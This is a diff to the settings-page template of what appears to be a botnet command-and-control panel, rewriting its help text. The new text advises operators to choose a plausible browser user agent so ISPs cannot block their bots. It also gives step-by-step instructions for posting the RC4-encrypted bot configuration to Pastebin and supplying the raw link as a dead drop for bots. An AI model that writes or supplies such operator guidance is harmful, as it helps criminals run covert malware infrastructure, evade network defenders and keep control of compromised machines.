@@ -125,7 +125,7 @@
                        <div class="form-group">
                             <label for="useragent">User Agent</label>
                             <input type="text" class="form-control" name="useragent" value="{$config.useragent}" id="useragent" aria-describedby="emailHelp" placeholder="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0">
-                            <small id="useragentHelper" class="form-text text-muted">The Bots will use this User Agent to knock on the panel. Must be used with every built BIN. If you change the string, old builds/bots are unable to connect.</small>
+                            <small id="useragentHelper" class="form-text text-muted">This is the user agent the bots will use to connect to the panel. You want to set a user agent which isn’t obviously incorrect, so ISPs cannot block your bots. Choose a user agent here: <a href="http://www.useragentstring.com/pages/useragentstring.php." target="_blank">useragentstring.com</a></small>
                         </div>
 
                         <div class="form-group">
@@ -150,7 +150,13 @@
                 <form method="POST">
                     {if $encryptedOUT != ""}
                         <div class="alert alert-success" role="alert">
-                            Add this to your Pastebin: <b><pre>{$encryptedOUT}</pre></b>
+
+                            Please go to pastebin.com, register a new account and create a new pastebin.<br>
+                            You want to paste the RC4 cypher  <b><pre>{$encryptedOUT}</pre></b> above into the pastebin & save it.
+                            Now, please paste the raw-link of your pastebin-URL.
+                            Now it looks like: <stong>https://pastebin.com/raw/YBGEBviB</stong>
+
+
                         </div>
                         <a  class="btn btn-primary"  href="/settings">Reload</a>
                     {else}
